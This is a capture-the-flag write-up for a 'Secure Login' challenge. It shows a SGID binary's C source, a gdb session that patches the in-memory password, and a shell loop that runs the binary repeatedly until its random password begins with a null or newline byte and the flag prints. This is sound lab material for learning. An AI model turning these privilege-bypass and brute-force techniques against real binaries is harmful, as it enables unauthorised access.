
# Secure Login

## Description

```
My login is, potentially, and I don't say this lightly, if you know me you know that's the truth, it's truly, and no this isn't snake oil, this is, no joke, the most secure login service in the world (source).

Try to hack me at /problems/2021/secure_login on the shell server.

Author: kmh
```

## Analysis

We get a SGID `login` binary that we need to use to read `flag.txt`.

```
team8838@actf:/problems/2021/secure_login$ ls -l
total 28
-r--r----- 1 problem2021_secure_login problem2021_secure_login    44 Apr  2 22:55 flag.txt
-r-xr-sr-x 1 problem2021_secure_login problem2021_secure_login 16584 Apr  2 22:56 login
-r--r--r-- 1 problem2021_secure_login problem2021_secure_login   621 Apr  2 22:54 login.c
```

Look at the source code in `login.c`:

```c
#include <stdio.h>

char password[128];

void generate_password() {
        FILE *file = fopen("/dev/urandom","r");
        fgets(password, 128, file);
        fclose(file);
}

void main() {
        puts("Welcome to my ultra secure login service!");

        // no way they can guess my password if it's random!
        generate_password();

        char input[128];
        printf("Enter the password: ");
        fgets(input, 128, stdin);

        if (strcmp(input, password) == 0) {
                char flag[128];

                FILE *file = fopen("flag.txt","r");
                if (!file) {
                    puts("Error: missing flag.txt.");
                    exit(1);
                }

                fgets(flag, 128, file);
                puts(flag);
        } else {
                puts("Wrong!");
        }
}
```

`generate_password()` generates a random string from `/dev/urandom` and then prompts for input and the input string has to match in order to read `flag.txt`.

It's easy enough to get past that check with gdb just by overwriting the contents of `password`:

```
team8838@actf:/problems/2021/secure_login$ gdb login
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from login...
(No debugging symbols found in login)
(gdb) r
Starting program: /problems/2021/secure_login/login 
Welcome to my ultra secure login service!
Enter the password: ^C
Program received signal SIGINT, Interrupt.
0x00007fa0f8d0a142 in __GI___libc_read (fd=0, buf=0x1bb8890, nbytes=1024)
    at ../sysdeps/unix/sysv/linux/read.c:26
26      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
(gdb) x/s 0x4040a0
0x4040a0 <password>:    "\"\v\305d8\025_\342n\230\033\225{m\254\065\351!\213\066t{\233\220\206^=IG\327\375\250\373\331\320C\340\324[\245\234\327\364\025\355\214Y~r\332\n"
(gdb) p strcpy(0x4040a0, "foo\n")
$1 = 0x4040a0 <password> "foo\n"
(gdb) c
Continuing.
foo
Error: missing flag.txt.
[Inferior 1 (process 3929348) exited with code 01]
(gdb) 
```

But it can't read the `flag.txt` that way because the binary is SGID and has to run as `problem2021_secure_login` while gdb only runs as `team8838`.

I started looking at LD_PRELOAD attacks, but those are supposed to be ignored on SUID / SGID binaries, and I couldn't get them to work, so that was a dead end.

The password is generated from `/dev/urandom` though, so...

## Solution

If you run it enough times, you'll eventually get '\n' or '\0' in the first character of `password`:

```
team8838@actf:/problems/2021/secure_login$ for i in `seq 1 100000`; do echo "" | ./login | grep actf; done
Enter the password: actf{if_youre_reading_this_ive_been_hacked}
Enter the password: actf{if_youre_reading_this_ive_been_hacked}
Enter the password: actf{if_youre_reading_this_ive_been_hacked}
```

